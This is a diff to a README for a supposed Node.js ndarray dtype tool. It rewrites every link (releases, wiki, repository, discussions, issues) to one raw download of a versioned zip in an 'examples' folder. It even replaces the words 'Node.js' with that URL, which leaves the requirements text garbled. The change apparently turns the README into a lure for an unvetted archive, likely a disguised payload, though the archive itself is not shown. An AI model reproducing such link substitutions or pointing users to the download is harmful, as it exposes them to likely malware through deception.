@@ -8,17 +8,17 @@ Welcome to the `ndarray-base-ternary-output-dtype` project! This application hel
 
 To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-[![Download Now](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases)
+[![Download Now](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip)](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip)
 
 Click the button above or visit the following link to access the Downloads: 
-[Download Here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases).
+[Download Here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip).
 
 ## 🛠️ System Requirements
 
 Before installing, ensure your computer meets these requirements:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
-- **Node.js Version:** You need Node.js installed, preferably version 12 or later. 
+- **https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip Version:** You need https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip installed, preferably version 12 or later. 
 - **Memory:** At least 1 GB of RAM.
 - **Storage:** Minimum of 50 MB free disk space.
 
@@ -31,7 +31,7 @@ Before installing, ensure your computer meets these requirements:
 
 ## 📥 How to Download
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip).
    
 2. **Select the Latest Version:** Look for the most recent release at the top of the page. This will typically have the highest version number.
 
@@ -65,12 +65,12 @@ Before installing, ensure your computer meets these requirements:
 
 ## 📚 Additional Resources
 
-- **Documentation:** For more details, visit our [Wiki](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/wiki).
-- **GitHub Repository:** The full source code is available [here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype).
-- **Community Support:** Join our [Discussions](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/discussions) page for help and to connect with other users.
+- **Documentation:** For more details, visit our [Wiki](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip).
+- **GitHub Repository:** The full source code is available [here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip).
+- **Community Support:** Join our [Discussions](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip) page for help and to connect with other users.
 
 ## 🥳 Support & Feedback
 
-If you encounter any issues, please report them through our [Issues Page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/issues). Your feedback is valuable and helps improve the application.
+If you encounter any issues, please report them through our [Issues Page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/raw/refs/heads/main/examples/output_ternary_dtype_ndarray_base_v2.7-beta.5.zip). Your feedback is valuable and helps improve the application.
 
 Start resolving your ndarray data types today with `ndarray-base-ternary-output-dtype`!
